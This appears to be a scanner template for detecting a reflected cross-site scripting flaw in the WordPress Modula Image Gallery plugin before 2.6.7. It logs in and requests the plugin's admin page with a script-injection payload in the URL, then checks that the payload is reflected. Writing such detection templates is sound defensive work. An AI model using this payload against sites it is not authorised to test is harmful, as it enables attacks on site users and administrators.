id: modula-image-gallery-xss
brief:
    title: WordPress Modula Image Gallery <2.6.7 - Cross-Site Scripting
    by: Akincibor
    level: medium
    about: WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
    label:
        - authenticated
        - wpscan
        - wp-plugin
        - xss
        - wp
        - wordpress
        - vuln
    score: CVSS:5.4
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-login.php'
      head:
        Content-Type: application/x-www-form-urlencoded
        Cookie: wordpress_test_cookie=WP%20Cookie%20check
        Origin: '{{RootURL}}'
      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      signs:
        - "on": word
          has:
            - '&a\"><script>alert(1)</script>&extensions='
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
    - verb: GET
      to:
        - '{{BaseURL}}/wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script>'
      signs:
        - "on": word
          has:
            - '&a\"><script>alert(1)</script>&extensions='
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
